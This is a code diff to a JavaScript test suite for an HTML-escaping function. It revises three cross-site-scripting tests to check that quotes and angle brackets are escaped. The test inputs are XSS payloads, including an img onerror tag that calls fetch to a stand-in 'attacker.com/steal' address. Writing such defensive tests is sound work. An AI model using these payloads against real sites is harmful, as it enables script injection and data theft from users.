@@ -165,21 +165,29 @@ describe('HTML Security Utilities', () => {
       const maliciousEmail = 'test@example.com" onload="alert(1)'
       const escaped = escapeHtml(maliciousEmail)
       const htmlTemplate = `<a href="mailto:${escaped}">Email</a>`
-      expect(htmlTemplate).not.toContain('onload')
+      // The escaped quotes prevent the onload from being interpreted as an attribute
+      expect(escaped).toContain('&quot;')
+      // Verify the dangerous pattern is neutralized by escaped quotes
+      expect(htmlTemplate).not.toContain('" onload="')
     })
 
     it('should prevent attribute-based XSS in subject', () => {
       const maliciousSubject = '" onmouseover="alert(1)'
       const escaped = escapeHtml(maliciousSubject)
       const htmlTemplate = `<p title="${escaped}">Subject</p>`
-      expect(htmlTemplate).not.toContain('onmouseover')
+      // The escaped quotes prevent the onmouseover from being interpreted as an attribute
+      expect(escaped).toContain('&quot;')
+      // Verify the dangerous pattern is neutralized by escaped quotes
+      expect(htmlTemplate).not.toContain('" onmouseover="')
     })
 
     it('should prevent content-based XSS in message', () => {
       const maliciousMessage = '<img src=x onerror="fetch(\'https://attacker.com/steal\')">'
       const escaped = escapeHtml(maliciousMessage)
-      expect(escaped).not.toContain('onerror')
-      expect(escaped).not.toContain('fetch')
+      // Verify angle brackets are escaped, preventing tag injection
+      expect(escaped).not.toContain('<img')
+      expect(escaped).toContain('&lt;img')
+      expect(escaped).not.toContain('</')
     })
   })
 })
